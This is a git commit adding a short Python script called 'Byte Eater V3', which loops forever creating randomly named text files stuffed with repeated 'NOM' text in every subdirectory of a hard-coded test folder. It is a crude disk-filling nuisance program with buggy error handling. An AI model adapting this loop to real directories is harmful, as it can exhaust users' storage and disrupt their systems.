226f9dc21f06744e4971e4154015d616f707df1f
samwrigh-t <62074993+samwrigh-t@users.noreply.github.com>
2020-03-11 18:37:16 +0000

    Add files via upload

---
+++ ByteEater.py
@@ -0,0 +1,51 @@
+
+
+
+# BYTE EATER V3
+
+import os
+import random
+dictionary = "abcdefghijklmnopqrstuvwxyz123456789"
+
+
+
+
+def GetSubDirectories(parentDir):
+    subDirectories = []
+    try:
+        currentDirectory = os.listdir(parentDir)
+    except FileNotFoundError:
+        return False
+    for x in range(0,len(currentDirectory)-1):
+        if (str(currentDirectory[x])[0]!="$"):
+            if (str(currentDirectory[x])[-4:] != ".sys"):
+                try:
+                    GetSubDirectories(parentDir + str(currentDirectory[x]))
+                    subDirectories.append(currentDirectory[x])
+
+                except PermissionError or FileNotFoundError:
+                    continue
+    return subDirectories
+
+baseDir = str("C:/Users/Sam/Desktop/Testy/")
+#print(baseDir + GetSubDirectories(baseDir)[0] + "/hi.txt")
+
+
+def RandomFileName():
+    name = "/"
+    for i in range(random.randint(3,12)):
+        name += dictionary[random.randint(0,(len(dictionary)-1))]
+    name += ".txt"                  
+    return name
+
+try:
+    while True:
+        directories = GetSubDirectories(baseDir)
+        for x in range(len(directories)):
+            file = open(baseDir + str(directories[x]) + RandomFileName(), "w")
+            for i in range(0, random.randint(500,10000)):
+                file.write("NOM")
+            file.close()
+except KeyboardInterrupt:
+    file.close()
+
